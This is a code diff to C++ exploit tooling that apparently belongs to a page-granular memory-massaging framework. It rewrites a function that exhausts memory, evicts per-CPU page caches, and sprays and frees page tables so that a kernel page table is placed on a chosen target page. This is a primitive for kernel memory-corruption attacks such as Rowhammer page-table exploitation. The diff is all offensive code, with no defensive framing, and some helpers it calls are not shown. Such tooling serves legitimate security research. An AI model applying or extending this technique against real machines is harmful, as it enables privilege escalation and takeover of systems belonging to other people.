@@ -1,33 +1,36 @@
 #include "rubicon.hpp"
 
-#include <cstdio>
 #include <fcntl.h>
 #include <sys/mman.h>
 
-int pt_spray_bait_allocator(void* ctx) {
-    return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
-}
+void* pt_install(const std::vector<void*>& bait_pages,
+                 void* pt_target,
+                 void* addr,
+                 int fd_spray) {
+    unsigned long exhaust_size = exhaust_pages_size_bytes();
+    auto exhaust_ptr = mmap(NULL, exhaust_size, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
 
-void
-* pt_install(void* bait_ptr, void* pt_target, void* addr, int fd) {
-    auto spray_args = pt_spray_args_t{
-        .start = (void*)SPRAY_START,
-        .fd = fd,
-        .nr_tables = NR_PAGE_TABLES_SPRAY,
-    };
+    unmap_pages(bait_pages);
+    pcp_evict();
 
-    migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
-                           &spray_args);
-    pt_unspray_tables(spray_args);
+    auto spray = strided_addresses((void*)SPRAY_START, NR_PAGE_TABLES_SPRAY,
+                                   kX86_64PageTableSpan);
+    map_pages(spray, fd_spray);
+
+    munmap(exhaust_ptr, exhaust_size);
+
+    const std::vector spray_tail(spray.begin() + 1, spray.end());
+    unmap_pages(spray_tail); // unmaps p1 … pN-1
 
     // Move the target as next candidate for page table allocation
-    munlock(pt_target, PAGE_SIZE);
-    block_merge(pt_target, 0);
-
     // Install the page table at the target.
+    munlock(pt_target, PAGE_SIZE);
+    munmap(pt_target, PAGE_SIZE);
+
     return mmap(addr, PAGE_SIZE,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_POPULATE,
-                fd,
+                fd_spray,
                 0);
 }
